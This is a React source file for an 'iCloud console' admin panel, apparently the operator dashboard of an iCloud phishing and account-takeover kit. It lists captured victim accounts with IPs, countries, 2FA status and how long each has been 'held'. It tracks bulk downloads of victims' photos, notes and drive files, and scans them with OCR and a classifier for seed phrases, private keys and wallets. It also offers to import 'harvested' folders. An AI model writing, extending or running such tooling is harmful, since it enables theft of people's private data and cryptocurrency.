import { useEffect, useMemo, useState } from "react";
import { useAdminSocket } from "./useAdminSocket";
import {
  adminLogin,
  adminLogout,
  adminSession,
  bytes,
  countryFlag,
  getClassify,
  getStorage,
  timeAgo,
} from "./api.js";
import { AccountBadge, Badge, StatusDot } from "./ui.jsx";
import { accountBadges } from "./badges.js";
import AccountView from "./AccountView.jsx";
import LibraryTab from "./LibraryTab.jsx";
import CryptoTab from "./CryptoTab.jsx";
import ServicesTab from "./ServicesTab.jsx";
import BlocksTab from "./BlocksTab.jsx";

/* ------------------------------------------------------------------ login */

function Login({ onConnect, notice }) {
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  async function submit(event) {
    event.preventDefault();
    if (!password || busy) return;
    setBusy(true);
    setError("");
    try {
      const result = await adminLogin(password);
      if (!result.ok) {
        setError(result.error || "Wrong password");
        return;
      }
      await onConnect(result);
    } catch (failure) {
      setError(failure.message);
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#f5f5f7] px-6">
      <form
        onSubmit={submit}
        className="w-full max-w-[400px] rounded-[16px] border border-[#e5e5ea] bg-white p-8 shadow-[0_10px_40px_rgba(0,0,0,0.06)]"
      >
        <div className="flex items-center gap-2">
          <span className="flex h-8 w-8 items-center justify-center rounded-[9px] bg-[#1d1d1f] text-[15px] text-white">
            
          </span>
          <h1 className="text-[20px] font-semibold tracking-[-0.3px]">iCloud console</h1>
        </div>
        <p className="mt-2 text-[13px] leading-5 text-[#6e6e73]">
          The password is checked by the server. This browser stays signed in for 7 days.
        </p>
        <label className="mt-6 block text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
          Password
          <input
            type="password"
            autoFocus
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            className="mt-2 block h-11 w-full rounded-[10px] border border-[#d2d2d7] px-3 text-[15px] font-normal tracking-normal text-[#1d1d1f] outline-none focus:border-[#0071e3]"
          />
        </label>
        {error || notice ? (
          <p className="mt-3 text-[12px] text-[#d70015]">{error || notice}</p>
        ) : null}
        <button
          type="submit"
          disabled={busy || !password}
          className="mt-5 h-11 w-full rounded-[10px] bg-[#0071e3] text-[14px] font-medium text-white disabled:opacity-50"
        >
          {busy ? "Signing in…" : "Sign in"}
        </button>
      </form>
    </div>
  );
}

/* ------------------------------------------------------------------- shell */

function AccountRow({ account, active, onClick, now, local }) {
  const cloud = Number(account.counts?.images ?? 0);
  const onDisk = Number(local?.photos ?? 0) + Number(local?.videos ?? 0);
  const badges = accountBadges(account, now);
  return (
    <button
      type="button"
      onClick={onClick}
      className={`flex w-full items-start gap-2.5 border-b border-[#f2f2f5] px-3 py-2.5 text-left ${
        active ? "bg-[#eef5ff]" : "hover:bg-[#fafafa]"
      }`}
    >
      <StatusDot account={account} className="mt-[6px]" />
      <span className="min-w-0 flex-1">
        <span className="flex items-center justify-between gap-2">
          <span className="truncate text-[12px] font-medium text-[#1d1d1f]">{account.email}</span>
          <span className="shrink-0 text-[10px] text-[#9a9aa0]">{timeAgo(account.updatedAt)}</span>
        </span>
        <span className="mt-0.5 flex flex-wrap items-center gap-1.5">
          <span className="text-[10px]">{countryFlag(account.geo?.countryCode)}</span>
          <AccountBadge account={account} />
          {badges.map((badge) => (
            <span
              key={badge.key}
              className={`rounded-full px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.04em] ${badge.className}`}
            >
              {badge.label}
            </span>
          ))}
          {account.hidden ? (
            <span className="rounded-full bg-[#f2f2f7] px-1.5 py-0.5 text-[9px] font-semibold uppercase text-[#6e6e73]">
              hidden
            </span>
          ) : null}
          {account.identity?.name ? (
            <span className="truncate text-[10px] text-[#6e6e73]">{account.identity.name}</span>
          ) : null}
          {account.createdAt ? (
            <span
              className="rounded-full bg-[#f5f5f7] px-1.5 py-0.5 text-[9px] font-medium text-[#6e6e73]"
              title={`account added ${new Date(account.createdAt).toLocaleString()}`}
            >
              held {timeAgo(account.createdAt)}
            </span>
          ) : null}
          {cloud > 0 ? (
            <span className="rounded-full bg-[#f2f2f7] px-1.5 py-0.5 text-[9px] font-medium text-[#424245]">
              cloud {cloud.toLocaleString()}
            </span>
          ) : null}
          {onDisk > 0 ? (
            <span className="rounded-full bg-[#eef8f1] px-1.5 py-0.5 text-[9px] font-medium text-[#1d7a3a]">
              local {onDisk.toLocaleString()}
            </span>
          ) : null}
          {Number(local?.bucket ?? 0) > 0 ? (
            <span className="rounded-full bg-[#f0f0f5] px-1.5 py-0.5 text-[9px] font-medium text-[#5b5b63]">
              S4 {Number(local.bucket).toLocaleString()}
            </span>
          ) : null}
        </span>
      </span>
    </button>
  );
}

function Metric({ label, value }) {
  return (
    <div className="rounded-[12px] border border-[#e5e5ea] bg-white px-4 py-3">
      <div className="text-[10px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">{label}</div>
      <div className="mt-0.5 text-[22px] font-semibold text-[#1d1d1f]">{value}</div>
    </div>
  );
}

function Welcome({ stats, onPick }) {
  return (
    <div className="flex h-full flex-col justify-center px-8 py-10">
      <div className="mx-auto w-full max-w-[760px]">
        <h2 className="text-[26px] font-semibold tracking-[-0.4px]">Manage every account</h2>
        <p className="mt-1 text-[14px] leading-6 text-[#6e6e73]">
          Pick an account on the left to browse its photos (Library, Hidden, Recently Deleted), notes,
          drive, contacts, calendar and reminders — or verify the export against live iCloud, run OCR
          and search seed phrases.
        </p>
        <div className="mt-5 grid grid-cols-2 gap-3 sm:grid-cols-3">
          <Metric label="Accounts" value={stats?.total ?? 0} />
          <Metric label="Connected" value={stats?.byStatus?.connected ?? 0} />
          <Metric label="2FA pending" value={stats?.byStatus?.twofa ?? 0} />
          <Metric label="Exporting" value={stats?.byStatus?.exporting ?? 0} />
          <Metric label="Trusted" value={stats?.trusted ?? 0} />
          <Metric label="Locked" value={stats?.byStatus?.error ?? 0} />
        </div>
        <p className="mt-5 text-[12px] text-[#6e6e73]">Click any account in the sidebar to open it.</p>
      </div>
    </div>
  );
}

function Submissions({ admin }) {
  const { state, loadPage, saveItem } = admin;
  return (
    <div className="h-full overflow-y-auto bg-[#f5f5f7] p-4">
      <div className="rounded-[14px] border border-[#e5e5ea] bg-white">
        <div className="flex items-center justify-between border-b border-[#f0f0f2] px-4 py-3">
          <h2 className="text-[14px] font-semibold">Submissions</h2>
          <button
            type="button"
            onClick={() => loadPage(state.page, state.query)}
            className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
          >
            Refresh
          </button>
        </div>
        <table className="w-full border-collapse text-left text-[12px]">
          <thead>
            <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
              <th className="px-4 py-2 font-medium">Email</th>
              <th className="px-4 py-2 font-medium">IP</th>
              <th className="px-4 py-2 font-medium">Country</th>
              <th className="px-4 py-2 font-medium">Status</th>
              <th className="px-4 py-2 font-medium">Created</th>
            </tr>
          </thead>
          <tbody>
            {state.items.map((item) => (
              <tr key={item.id} className="border-b border-[#f4f4f6] last:border-0">
                <td className="px-4 py-2">{item.email || "—"}</td>
                <td className="px-4 py-2 font-mono text-[11px]">{item.ip || "—"}</td>
                <td className="px-4 py-2">{item.country || "—"}</td>
                <td className="px-4 py-2">
                  <select
                    value={item.status}
                    onChange={(event) => saveItem(item.id, { status: event.target.value })}
                    className="h-7 rounded-[6px] border border-[#d2d2d7] bg-white px-2 text-[11px]"
                  >
                    <option value="new">new</option>
                    <option value="reviewed">reviewed</option>
                    <option value="done">done</option>
                  </select>
                </td>
                <td className="px-4 py-2 text-[11px] text-[#6e6e73]">
                  {new Date(item.createdAt).toLocaleString()}
                </td>
              </tr>
            ))}
            {!state.items.length ? (
              <tr>
                <td colSpan={5} className="px-4 py-8 text-center text-[#6e6e73]">
                  No submissions.
                </td>
              </tr>
            ) : null}
          </tbody>
        </table>
      </div>
    </div>
  );
}

function Panel({ admin, onLogout, warnings = [] }) {
  const [warningsOpen, setWarningsOpen] = useState(true);
  const {
    state,
    loadAccounts,
    refreshAll,
    importAccount,
    openAccount,
    clearAccount,
    pingAccount,
    exportAccount,
    verifyAccount,
    scanAccount,
    hideAccount,
    hideAll,
    recheckAll,
    disconnect,
  } = admin;
  const [query, setQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [view, setView] = useState("accounts");
  const [showList, setShowList] = useState(true);
  const [now, setNow] = useState(Date.now());
  const [importOpen, setImportOpen] = useState(false);
  const [importPath, setImportPath] = useState("");
  const [importEmail, setImportEmail] = useState("");
  const [importBusy, setImportBusy] = useState(false);
  const [importError, setImportError] = useState("");
  const [storage, setStorage] = useState(null);
  const [classify, setClassify] = useState(null);

  useEffect(() => {
    if (state.status !== "online") return undefined;
    const timer = setTimeout(
      () => loadAccounts(1, query.trim(), filter === "hidden" ? "hidden" : "visible"),
      250
    );
    return () => clearTimeout(timer);
  }, [query, filter, loadAccounts, state.status]);

  // Local vs cloud: refreshed once a minute while the panel is open.
  useEffect(() => {
    if (state.status !== "online") return undefined;
    let alive = true;
    const load = () =>
      getStorage()
        .then((data) => {
          if (alive && data?.ok) setStorage(data);
        })
        .catch(() => {});
    load();
    const timer = setInterval(load, 60_000);
    return () => {
      alive = false;
      clearInterval(timer);
    };
  }, [state.status]);

  // Photo labels: live while the classifier is running.
  useEffect(() => {
    if (state.status !== "online") return undefined;
    let alive = true;
    const load = () =>
      getClassify()
        .then((data) => {
          if (alive && data?.ok) setClassify(data);
        })
        .catch(() => {});
    load();
    const timer = setInterval(load, 10_000);
    return () => {
      alive = false;
      clearInterval(timer);
    };
  }, [state.status]);

  // Expire NEW / NEW FILES / NEW SEEDS labels without a manual refresh.
  useEffect(() => {
    const timer = setInterval(() => setNow(Date.now()), 30_000);
    return () => clearInterval(timer);
  }, []);

  const accounts = useMemo(() => {
    const needle = query.trim().toLowerCase();
    return state.accounts.filter((account) => {
      if (filter !== "hidden") {
        if (
          filter === "live" &&
          !["connected", "done", "exporting", "queued", "auth"].includes(account.status)
        )
          return false;
        if (filter === "locked" && !account.locked) return false;
        if (filter === "issues" && !["error", "invalid", "dead", "twofa"].includes(account.status)) return false;
      }
      if (!needle) return true;
      return `${account.email} ${account.identity?.name ?? ""} ${account.status}`
        .toLowerCase()
        .includes(needle);
    });
  }, [state.accounts, filter, query]);

  async function logout() {
    disconnect();
    await onLogout();
  }

  return (
    <div className="flex h-screen flex-col overflow-hidden bg-[#f5f5f7] text-[#1d1d1f]">
      {warnings.length && warningsOpen ? (
        <div className="flex flex-wrap items-center gap-x-3 gap-y-1 border-b border-[#f3dfa8] bg-[#fff8e6] px-4 py-2 text-[11px] text-[#8a6100]">
          <b className="uppercase tracking-[0.05em]">Security</b>
          {warnings.map((warning) => (
            <span key={warning}>{warning}</span>
          ))}
          <span className="text-[#a07b16]">→ set them in .env and restart</span>
          <button
            type="button"
            onClick={() => setWarningsOpen(false)}
            className="ml-auto rounded-full px-2 py-0.5 text-[11px] text-[#8a6100] hover:bg-[#f7e7bb]"
            aria-label="Dismiss security warnings"
          >
            ×
          </button>
        </div>
      ) : null}
      <div className="flex min-h-0 flex-1 overflow-hidden">
      <aside
        className={`${
          showList ? "flex" : "hidden"
        } w-full shrink-0 flex-col border-r border-[#e5e5ea] bg-white lg:flex lg:w-[330px]`}
      >
        <header className="border-b border-[#e5e5ea] px-4 py-3">
          <div className="flex items-center justify-between gap-2">
            <div className="flex items-center gap-2">
              <span className="flex h-6 w-6 items-center justify-center rounded-[7px] bg-[#1d1d1f] text-[12px] text-white">
                
              </span>
              <span className="text-[14px] font-semibold tracking-[-0.2px]">iCloud console</span>
            </div>
            <span className="flex items-center gap-1 text-[10px] text-[#6e6e73]">
              <span
                className={`h-1.5 w-1.5 rounded-full ${
                  state.status === "online" ? "bg-[#30a14e]" : "bg-[#d70015]"
                }`}
              />
              {state.status}
            </span>
          </div>
          <div className="mt-3 flex flex-wrap gap-1">
            <button
              type="button"
              onClick={() => setView("accounts")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "accounts" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Accounts
            </button>
            <button
              type="button"
              onClick={() => setView("library")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "library" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              All
            </button>
            <button
              type="button"
              onClick={() => setView("crypto")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "crypto" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              ₿ Crypto
            </button>
            <button
              type="button"
              onClick={() => setView("submissions")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "submissions" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Submissions
            </button>
            <button
              type="button"
              onClick={() => setView("services")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "services" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Services
            </button>
            <button
              type="button"
              onClick={() => setView("blocks")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "blocks" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Blocks
            </button>
            <span className="ml-auto" />
          </div>
        </header>

        {view === "accounts" || view === "services" ? (
          <>
            <div className="border-b border-[#e5e5ea] px-3 py-2">
              <input
                value={query}
                onChange={(event) => setQuery(event.target.value)}
                placeholder="Search accounts…"
                className="h-8 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] outline-none focus:border-[#0071e3]"
              />
              <div className="mt-2 flex flex-wrap gap-1">
                {[
                  ["all", "All"],
                  ["live", "Live"],
                  ["locked", "Locked"],
                  ["issues", "Issues"],
                  ["hidden", "Hidden"],
                ].map(([id, label]) => (
                  <button
                    key={id}
                    type="button"
                    onClick={() => setFilter(id)}
                    className={`h-6 rounded-full px-2.5 text-[10px] font-medium ${
                      filter === id
                        ? "bg-[#eef5ff] text-[#0058b0]"
                        : "text-[#6e6e73] hover:bg-[#f5f5f7]"
                    }`}
                  >
                    {label}
                  </button>
                ))}
                <button
                  type="button"
                  onClick={() => {
                    setImportError("");
                    setImportOpen(true);
                  }}
                  className="ml-auto h-6 rounded-full px-2 text-[10px] font-medium text-[#0066cc] hover:underline"
                >
                  ＋ Import
                </button>
                <button
                  type="button"
                  onClick={refreshAll}
                  className="h-6 rounded-full px-2 text-[10px] text-[#0066cc] hover:underline"
                >
                  Refresh
                </button>
              </div>
              <div className="mt-2 flex flex-wrap items-center gap-1">
                <button
                  type="button"
                  onClick={recheckAll}
                  className="h-6 rounded-full bg-[#eef5ff] px-2.5 text-[10px] font-medium text-[#0058b0] hover:bg-[#e2efff]"
                >
                  ⟳ Recheck all
                </button>
                {filter === "hidden" ? (
                  <span className="text-[10px] text-[#6e6e73]">
                    hidden accounts · open one to show it again
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={() => {
                      if (
                        window.confirm(
                          `Hide all ${state.accountsTotal} visible account(s) from the list?\n\nSessions, exports and files are kept.`
                        )
                      ) {
                        hideAll();
                      }
                    }}
                    className="h-6 rounded-full border border-[#d2d2d7] px-2.5 text-[10px] text-[#424245] hover:bg-[#fafafa]"
                  >
                    Hide all
                  </button>
                )}
                {state.accountStats?.hidden ? (
                  <span className="ml-auto text-[10px] text-[#9a9aa0]">
                    {state.accountStats.hidden} hidden
                  </span>
                ) : null}
              </div>
            </div>

            {storage ? (
              <div className="border-b border-[#e5e5ea] bg-[#fafafa] px-3 py-2">
                {(() => {
                  const totals = storage.totals || {};
                  const done = Number(totals.donePct || 0);
                  const pending = Number(totals.pending || 0);
                  return (
                    <>
                      <div className="flex items-center justify-between text-[10px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
                        <span>Download progress</span>
                        <span className="normal-case tracking-normal text-[#1d1d1f]">
                          {done}% done
                        </span>
                      </div>
                      <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-[#e5e5ea]">
                        <div className="h-1.5 rounded-full bg-[#30a14e]" style={{ width: `${done}%` }} />
                      </div>
                      <div className="mt-1 flex items-center justify-between text-[10px]">
                        <span className="text-[#1d7a3a]">
                          ✓ {Number(totals.downloaded || 0).toLocaleString()} downloaded
                        </span>
                        <span className="text-[#8a6100]">
                          {pending.toLocaleString()} left ({totals.pendingPct || 0}%)
                        </span>
                      </div>
                      <div className="text-[9px] text-[#9a9aa0]">
                        {Number(totals.cloud || 0).toLocaleString()} images in iCloud ·{" "}
                        {Number(totals.local || 0).toLocaleString()} on disk ·{" "}
                        {Number(totals.bucket || 0).toLocaleString()} on S4
                      </div>
                    </>
                  );
                })()}
                {classify?.progress ? (
                  <div className="mt-2 border-t border-[#e5e5ea] pt-2">
                    {(() => {
                      const p = classify.progress;
                      const done = Number(p.done || 0);
                      const total = Number(p.total || 0);
                      const pct = total ? Math.min(100, Math.round((done / total) * 100)) : 0;
                      const left = Math.max(0, total - done);
                      const eta = Number(p.etaSeconds || 0);
                      const labels = classify.labels || {};
                      const top = ["seed", "seed-candidate", "privatekey", "wallet"]
                        .filter((id) => labels[id])
                        .map((id) => `${labels[id]} ${id}`)
                        .join(" · ");
                      return (
                        <>
                          <div className="flex items-center justify-between text-[10px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
                            <span>Classify progress</span>
                            <span className="normal-case tracking-normal text-[#1d1d1f]">
                              {pct}% · {p.rate || 0}/s
                            </span>
                          </div>
                          <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-[#e5e5ea]">
                            <div
                              className="h-1.5 rounded-full bg-[#0071e3]"
                              style={{ width: `${pct}%` }}
                            />
                          </div>
                          <div className="mt-1 flex items-center justify-between text-[10px]">
                            <span className="text-[#1d1d1f]">
                              {done.toLocaleString()} / {total.toLocaleString()} labelled
                            </span>
                            <span className="text-[#6e6e73]">
                              {p.phase === "finished"
                                ? "finished"
                                : `${left.toLocaleString()} left · ${Math.floor(eta / 60)}m${String(eta % 60).padStart(2, "0")}s`}
                            </span>
                          </div>
                          {top ? (
                            <div className="text-[9px] text-[#9a9aa0]">
                              {top} · {Number(classify.classified || 0).toLocaleString()} with a label
                            </div>
                          ) : null}
                        </>
                      );
                    })()}
                  </div>
                ) : null}
                {storage.disks.map((disk) => {
                  const pct = disk.total ? Math.min(100, Math.round((disk.used / disk.total) * 100)) : 0;
                  const slot = (storage.perDisk || {})[disk.label];
                  return (
                    <div key={disk.label} className="mt-1.5">
                      <div className="flex items-center justify-between text-[10px] text-[#6e6e73]">
                        <span className="capitalize">
                          {disk.label}
                          {slot ? (
                            <span className="ml-1.5 text-[#1d1d1f]">
                              {Number(slot.photos + slot.videos).toLocaleString()} img
                              {" · "}
                              {bytes(slot.bytes)}
                            </span>
                          ) : null}
                        </span>
                        <span>
                          {bytes(disk.free)} free of {bytes(disk.total)}
                        </span>
                      </div>
                      <div className="mt-0.5 h-1 overflow-hidden rounded-full bg-[#e5e5ea]">
                        <div
                          className={`h-1 rounded-full ${pct > 90 ? "bg-[#d70015]" : pct > 75 ? "bg-[#ff9f0a]" : "bg-[#0071e3]"}`}
                          style={{ width: `${pct}%` }}
                        />
                      </div>
                    </div>
                  );
                })}
              </div>
            ) : null}

            <div className="min-h-0 flex-1 overflow-y-auto">
              {accounts.map((account) => (
                <AccountRow
                  key={account.id}
                  account={account}
                  local={storage?.accounts?.[account.id]}
                  now={now}
                  active={state.selectedAccount?.id === account.id}
                  onClick={() => {
                    setView("accounts");
                    setShowList(false);
                    openAccount(account.id);
                  }}
                />
              ))}
              {!accounts.length ? (
                <p className="px-4 py-8 text-center text-[12px] text-[#6e6e73]">
                  {state.accounts.length ? "No account matches this filter." : "No visitors yet."}
                </p>
              ) : null}
            </div>

            <footer className="border-t border-[#e5e5ea] px-3 py-2 text-[10px] text-[#6e6e73]">
              <div className="flex items-center justify-between">
                <span>
                  {accounts.length} accounts
                  {accounts.length !== state.accountsTotal
                    ? ` · ${state.accountsTotal} total`
                    : ""}
                </span>
                {state.accountPages > 1 ? (
                  <span className="flex gap-1">
                    <button
                      type="button"
                      disabled={state.accountPage <= 1}
                      onClick={() => loadAccounts(state.accountPage - 1, query.trim())}
                      className="rounded px-1 disabled:opacity-30"
                    >
                      ‹
                    </button>
                    <button
                      type="button"
                      disabled={state.accountPage >= state.accountPages}
                      onClick={() => loadAccounts(state.accountPage + 1, query.trim())}
                      className="rounded px-1 disabled:opacity-30"
                    >
                      ›
                    </button>
                  </span>
                ) : null}
              </div>
              <div className="mt-1 flex items-center justify-between">
                <span>
                  workers {state.workers?.workers ?? 0} · auth {state.workers?.auth ?? 0} · export{" "}
                  {state.workers?.export ?? 0}
                </span>
                <span>
                  {state.wave?.mode
                    ? `wave ${state.wave.mode} ${state.wave.done}/${state.wave.total}`
                    : `queue ${state.workers?.queued ?? 0}`}
                </span>
              </div>
              {state.log[0] ? <div className="mt-1 truncate text-[#9a9aa0]">{state.log[0]}</div> : null}
            </footer>
          </>
        ) : (
          <div className="min-h-0 flex-1 overflow-y-auto p-3">
            <p className="text-[12px] leading-5 text-[#6e6e73]">
              Legacy form submissions. Account data lives under Accounts.
            </p>
            <div className="mt-2 flex flex-wrap gap-1.5">
              <Badge tone="gray">total {state.total}</Badge>
              <Badge tone="blue">new {state.stats?.byStatus?.new ?? 0}</Badge>
              <Badge tone="yellow">reviewed {state.stats?.byStatus?.reviewed ?? 0}</Badge>
              <Badge tone="green">done {state.stats?.byStatus?.done ?? 0}</Badge>
            </div>
          </div>
        )}
      </aside>

      {importOpen ? (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/30 px-4">
          <form
            onSubmit={async (event) => {
              event.preventDefault();
              if (importBusy) return;
              setImportBusy(true);
              setImportError("");
              try {
                const result = await importAccount(importPath.trim(), importEmail.trim());
                setImportOpen(false);
                setImportPath("");
                setImportEmail("");
                if (result?.accountId) {
                  setShowList(false);
                  openAccount(result.accountId);
                }
              } catch (failure) {
                setImportError(failure.message);
              } finally {
                setImportBusy(false);
              }
            }}
            className="w-full max-w-[480px] rounded-[14px] border border-[#e5e5ea] bg-white p-5 shadow-2xl"
          >
            <h2 className="text-[16px] font-semibold">Import a harvested folder</h2>
            <p className="mt-1 text-[12px] leading-5 text-[#6e6e73]">
              Maps an <code>out/</code> tree (photos, hidden, notes, drive, ocr) into this
              account's export, reusing the existing OCR and seed results. The folder must be on
              the server.
            </p>
            <label className="mt-4 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
              Folder path
              <input
                value={importPath}
                onChange={(event) => setImportPath(event.target.value)}
                placeholder="/home/…/connect_icloud/out"
                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
              />
            </label>
            <label className="mt-3 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
              Account email
              <input
                value={importEmail}
                onChange={(event) => setImportEmail(event.target.value)}
                placeholder="example@icloud.com"
                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
              />
            </label>
            {importError ? (
              <p className="mt-3 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[11px] text-[#c4000a]">{importError}</p>
            ) : null}
            <div className="mt-4 flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setImportOpen(false)}
                className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={importBusy || !importPath.trim() || !importEmail.trim()}
                className="h-8 rounded-[8px] bg-[#0071e3] px-3 text-[12px] font-medium text-white disabled:opacity-50"
              >
                {importBusy ? "Importing…" : "Import"}
              </button>
            </div>
          </form>
        </div>
      ) : null}

      <main className={`${showList ? "hidden" : "flex"} min-w-0 flex-1 flex-col lg:flex`}>
        {view === "services" ? (
          <ServicesTab admin={admin} />
        ) : view === "blocks" ? (
          <BlocksTab admin={admin} />
        ) : view === "submissions" ? (
          <Submissions admin={admin} />
        ) : view === "crypto" ? (
          <CryptoTab />
        ) : view === "library" ? (
          <LibraryTab admin={admin} />
        ) : state.selectedAccount ? (
          <AccountView
            key={state.selectedAccount.id}
            account={state.selectedAccount}
            jobs={state.accountJobs}
            exportEnabled={state.exportEnabled}
            now={now}
            onPing={pingAccount}
            onExport={exportAccount}
            onVerify={verifyAccount}
            onScan={scanAccount}
            onHide={(hidden) => hideAccount(state.selectedAccount.id, hidden)}
            onClose={() => {
              clearAccount();
              setShowList(true);
            }}
          />
        ) : (
          <Welcome stats={state.accountStats} />
        )}
      </main>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------- gate */

export default function Admin() {
  const admin = useAdminSocket();
  const [authed, setAuthed] = useState(null);
  const [notice, setNotice] = useState("");
  const [warnings, setWarnings] = useState([]);

  useEffect(() => {
    let alive = true;
    adminSession().then((session) => {
      if (!alive) return;
      setWarnings(session.warnings || []);
      setAuthed(session.ok);
      if (session.ok) admin.connect();
    });
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (authed && admin.state.status === "error" && /unauthorized/i.test(admin.state.error)) {
      setAuthed(false);
      setNotice("Session expired — sign in again.");
    }
  }, [authed, admin.state.status, admin.state.error]);

  if (authed === null) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f5f5f7] text-[13px] text-[#6e6e73]">
        Checking session…
      </div>
    );
  }

  if (!authed) {
    return (
      <Login
        notice={notice}
        onConnect={async (result) => {
          setNotice("");
          setWarnings(result?.warnings || []);
          setAuthed(true);
          admin.connect();
        }}
      />
    );
  }

  // The cookie can be valid while the socket still rejects it (stale password
  // or secret).  Do not show the panel until the admin namespace is online.
  if (admin.state.status !== "online") {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-2 bg-[#f5f5f7] px-6 text-center">
        <span className="text-[13px] text-[#6e6e73]">
          {admin.state.status === "error" ? "Console unavailable — retrying…" : "Connecting to the console…"}
        </span>
        {admin.state.error ? <span className="text-[11px] text-[#9a9aa0]">{admin.state.error}</span> : null}
      </div>
    );
  }

  return (
    <Panel
      admin={admin}
      warnings={warnings}
      onLogout={async () => {
        await adminLogout();
        setAuthed(false);
      }}
    />
  );
}
